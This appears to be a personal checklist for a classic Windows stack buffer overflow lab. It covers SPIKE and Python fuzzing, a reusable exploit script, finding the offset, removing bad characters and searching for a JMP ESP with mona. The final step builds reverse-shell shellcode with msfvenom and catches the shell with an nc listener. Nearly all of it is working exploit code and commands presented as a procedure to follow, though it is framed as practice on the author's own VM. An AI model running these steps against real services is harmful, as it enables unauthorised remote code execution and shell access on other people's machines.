# Buffer overflow

## Lab setup
- [ ] The same program running in Immunity Debugger on my own Windows VM: File, Open or Attach, then F9
- [ ] mona.py copied into Immunity's PyCommands folder
In Immunity's command bar, once:
!mona config -set workingfolder c:\mona\%p
- [ ] After every crash, Ctrl+F2 then F9 restarts it, before I send anything else
- [ ] Built against the VM, then run once against the target: only the IP and my shellcode's LHOST change

## Find the command that crashes
nc <TargetIP> <Port>
- [ ] HELP or the banner lists the commands; THE-COMMAND below is the one under test, with its trailing space
One SPIKE script per command, until one crashes with EIP 41414141:
cat > cmd.spk <<'EOF'
s_readline();
s_string("THE-COMMAND ");
s_string_variable("0");
EOF
generic_send_tcp <TargetIP> <Port> cmd.spk 0 0

## Roughly how long
cat > fuzz.py <<'EOF'
import socket, sys, time
n = 100
while True:
    try:
        with socket.create_connection(("<TargetIP>", <Port>), timeout=5) as s:
            s.recv(1024)
            print(f"Sending {n} bytes")
            s.send(b"THE-COMMAND " + b"A" * n + b"\r\n")
            s.recv(1024)
    except Exception:
        print(f"Crashed at {n} bytes")
        sys.exit(0)
    n += 100
    time.sleep(1)
EOF
python3 fuzz.py
- [ ] No banner from the service: the first s.recv line taken out, or it waits forever

## One script for every step
It takes the offset, the return address as eight hex digits, a file of bytes to send after it, and NOPs to put in between.
cat > bof.py <<'EOF'
import socket, sys
offset, retn, data = int(sys.argv[1]), bytes.fromhex(sys.argv[2])[::-1], open(sys.argv[3], "rb").read()
nops = b"\x90" * (int(sys.argv[4]) if len(sys.argv) > 4 else 0)
buf = b"THE-COMMAND " + b"A" * offset + retn + nops + data
with socket.create_connection(("<TargetIP>", <Port>)) as s:
    s.send(buf + b"\r\n")
print(f"Sent {len(buf)} bytes")
EOF

## The offset
THE-LENGTH is the crash length plus 400.
msf-pattern_create -l THE-LENGTH | tr -d '\n' > pattern.bin
python3 bof.py 0 '' pattern.bin
In Immunity, after the crash:
!mona findmsp -distance THE-LENGTH
Or on Kali, from the value in EIP:
msf-pattern_offset -l THE-LENGTH -q THE-EIP
- [ ] EIP contains normal pattern ... (offset N): N is the offset, and ESP should sit at N plus 4
printf '' > empty.bin
python3 bof.py <Offset> 42424242 empty.bin
- [ ] EIP is exactly 42424242; anything else, the offset is wrong

## Bad characters
\x00 is always bad. Start with it alone, in both lists:
!mona bytearray -b "\x00"
python3 -c 'bad = [0x00]; open("chars.bin", "wb").write(bytes(b for b in range(256) if b not in bad))'
python3 bof.py <Offset> 42424242 chars.bin
After the crash, with the address ESP holds:
!mona compare -f c:\mona\THE-PROGRAM\bytearray.bin -a THE-ESP
- [ ] Possibly bad chars 07 08: usually only the first of a pair is bad
Then one more out of both lists, restart, send, compare:
!mona bytearray -b "\x00\x07"
python3 -c 'bad = [0x00, 0x07]; open("chars.bin", "wb").write(bytes(b for b in range(256) if b not in bad))'
- [ ] Repeated until mona says Unmodified, one byte at a time
- [ ] The final list written down, such as \x00\x07\x2e\xa0, for the next two steps

## A JMP ESP
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
- [ ] Results in the Log window, Alt+L: a module with ASLR False and Rebase False
- [ ] Its address, eight hex digits with no 0x, is my JmpAddress
Or by hand, in one module from the list:
!mona modules
!mona find -s "\xff\xe4" -m THE-MODULE

## The exploit
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f raw -o shell.bin
rlwrap nc -lvnp <LPORT>
python3 bof.py <Offset> <JmpAddress> shell.bin 16
- [ ] -b lists every bad character, \x00 included
- [ ] EIP right but it crashes at ESP: a bad character missed, or too few NOPs
- [ ] No crash and no shell: the callback port blocked, or the command or \r\n not what the service wants
- [ ] Never stops at the JMP ESP: in Immunity, Ctrl+G to the address, F2 for a breakpoint, send again, then F7 into the NOPs
